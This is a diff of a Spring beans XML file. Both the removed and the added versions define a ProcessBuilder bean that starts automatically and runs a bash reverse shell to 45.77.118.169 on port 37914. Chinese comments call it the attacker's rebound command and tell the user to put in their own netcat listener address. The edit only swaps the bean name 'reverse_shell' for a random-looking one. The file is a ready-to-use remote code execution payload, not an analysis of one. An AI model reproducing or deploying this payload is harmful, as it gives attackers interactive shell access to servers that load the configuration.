@@ -4,16 +4,15 @@
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
 
-  <bean id="reverse_shell" class="java.lang.ProcessBuilder" init-method="start">
-    <constructor-arg>
-      <list>
-        <!-- 指定执行环境 -->
-        <value>bash</value>
-        <value>-c</value>
-        <!-- 核心反弹命令：将 Shell 的输入输出重定向到攻击者的网络 Socket -->
-        <value>bash -i &gt;&amp; /dev/tcp/45.77.118.169/37914 0&gt;&amp;1</value>
-      </list>
-    </constructor-arg>
-  </bean>
-
+    <!-- 使用一个新的、随机的 ID 以防冲突 -->
+    <bean id="demo_864" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>bash</value>
+                <value>-c</value>
+                <!-- 确保这里的 IP 和端口是你自己的 nc 监听地址 -->
+                <value>bash -i &gt;&amp; /dev/tcp/45.77.118.169/37914 0&gt;&amp;1</value>
+            </list>
+        </constructor-arg>
+    </bean>
 </beans>
